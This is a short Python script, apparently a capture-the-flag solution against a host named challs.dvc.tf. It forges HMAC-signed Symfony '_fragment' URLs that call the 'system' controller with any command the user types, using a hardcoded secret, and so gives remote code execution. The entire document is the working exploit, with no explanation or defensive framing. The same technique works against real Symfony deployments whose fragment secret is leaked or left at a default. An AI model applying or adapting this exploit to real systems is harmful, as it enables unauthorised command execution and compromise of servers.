import base64, hashlib, hmac, sys
import urllib.parse

def rce(cmd):
    cmd = cmd.replace(" ", "%2B")
    cmd = cmd.replace("/", "%252F")
    cmd = cmd.replace('"', "%2522")
    cmd = cmd.replace("|", "%257C")
    cmd = cmd.replace("<", "%253C")
    cmd = cmd.replace(">", "%253E")
    hash = base64.b64encode(hmac.HMAC(b'60b938ad59ac73568c7f2d6c282cd084', f'http://challs.dvc.tf:9000/_fragment?_path=_controller%3Dsystem%26command%3D{cmd}%26return_value%3Dnull'.encode(), hashlib.sha256).digest())
    print(cmd)
    print(f"http://challs.dvc.tf:9000/_fragment?_path=_controller%3Dsystem%26command%3D{cmd}%26return_value%3Dnull&_hash={hash.decode()}")


rce(input("Command: "))